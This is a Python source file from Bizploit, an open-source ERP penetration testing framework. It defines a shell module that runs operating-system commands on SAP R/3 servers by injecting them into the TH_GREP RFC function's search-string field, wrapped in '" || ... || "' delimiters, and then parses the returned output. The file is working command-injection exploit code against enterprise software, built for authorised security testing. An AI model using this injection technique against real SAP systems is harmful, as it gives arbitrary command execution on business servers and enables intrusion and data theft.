# -*- coding: latin-1 -*-
'''
---------------------------------------------------------------------------
Bizploit - The Opensource ERP Penetration Testing Framework. 
Download at http://www.onapsis.com/bizploit 
--------------------------------------------------------------------------- 

@author:  Sergio Javier Abraham <sabraham@onapsis.com>	
	
Copyright 2012 ONAPSIS S.R.L.

This program is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
---------------------------------------------------------------------------
'''
from core.exceptions.bizploitException import bizploitException
import core.output.outputManager as om
from fwk.shells.baseShell import baseShell


class THGREPShell(baseShell):
	'''
	Run operating system commands through RFC function TH_GREP.
	'''
	def __init__(self):
		baseShell.__init__(self)
		self._cmd = ""
		self._menu = {'run':self._run}

	def _onStart(self):
		self._om.console(self, 'THGREPShell - OS Commanding through RFC Calls')

	def _run_SAPRFC(self, parameters):
		'''
		Calls TH_GREP to run commands in SAP R/3 servers.			
		'''

		if len(parameters) < 1:
			self._parent._cmd_help(['run'])
			return

		self._cmd = ' '.join(parameters)

		try:
			self._connector.connect()

			iface = self._connector.discover("TH_GREP")
			command = '" || ' + self._cmd + ' || "'
			iface.STRING.setValue(command, len(command))
			self._connector.call_receive(iface)
			self.showParseResult(iface.RESULT.value)

			self._connector.disconnect()

		except Exception, e:
			raise bizploitException(str(e))
		return


	def showParseResult(self, listn):
		frst = self.firstPosition(listn)
		lst = self.lastPosition(listn, frst)

		for i in range(frst + 2, lst - 1):
			self.outInformation(listn[i].rstrip())

	def firstPosition(self, listn):
		i = 0
		for x in listn:
			if x.find("Pattern") == 0:
				return i
			i += 1

	def lastPosition(self, listn, pos):
		i = pos
		for x in listn[pos:]:
			if x.find("Search") == 0:
				return i
			i += 1

